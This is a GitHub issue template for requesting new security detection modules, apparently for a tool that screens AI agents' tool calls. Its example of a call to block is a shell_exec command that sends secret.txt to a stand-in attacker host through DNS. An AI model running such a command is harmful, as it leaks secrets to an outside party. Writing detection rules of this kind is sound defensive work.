---
name: Security Module Request
about: Request a new security detection module
title: "[Security]: "
labels: enhancement, security
assignees: ""
---

## Threat Model

What specific threat or attack vector does this module address? (e.g., "Data exfiltration via DNS tunneling")

## Detection Logic

How can this be detected in a tool call?

```typescript
// Example tool call that should be blocked
{
  name: "shell_exec",
  args: {
    command: "dig @attacker.com -p 53 secret.txt"
  }
}
```

## False Positives

Are there legitimate use cases that might be flagged by mistake?

## Proposed Action

- [ ] Block immediately
- [ ] Prompt user
- [ ] Redact response
